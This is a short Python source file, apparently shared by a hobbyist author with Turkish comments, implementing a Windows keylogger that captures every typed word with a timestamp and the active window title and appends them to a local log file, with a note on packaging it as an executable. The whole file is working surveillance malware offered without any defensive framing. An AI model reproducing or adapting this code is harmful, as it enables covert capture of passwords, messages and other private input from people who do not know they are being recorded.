import os
import sys
import time
import datetime
import win32gui
from pynput import keyboard


#WoxicDEV
#Instagram : woxicdev

filename = 'log.txt'  # kaydedilecek dosya adı

if not os.path.exists(filename):  # dosya yoksa oluştur
    open(filename, 'w', encoding='utf-8').close()

def get_active_window_title():
    window = win32gui.GetForegroundWindow()
    title = win32gui.GetWindowText(window)
    return title

current_text = ""
current_window = ""

def write_to_file(text, window):
    current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(filename, 'a', encoding='utf-8') as f:
        f.write(f"[{current_time}] - [{window}] - {text}\n")

def on_press(key):
    global current_text, current_window

    if key == keyboard.Key.space:
        if current_text:
            write_to_file(current_text, current_window)
            current_text = ""
    elif key == keyboard.Key.enter:
        write_to_file(current_text, current_window)
        current_text = ""
    elif key == keyboard.Key.backspace:
        current_text = current_text[:-1]
    elif hasattr(key, 'char'):
        current_text += key.char

    current_window = get_active_window_title()

def on_release(key):
    if key == keyboard.Key.esc:
        if current_text:
            write_to_file(current_text, current_window)
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

if getattr(sys, 'frozen', False):  # pyinstaller ile exe'ye dönüştürüldüyse
    sys.exit(0)
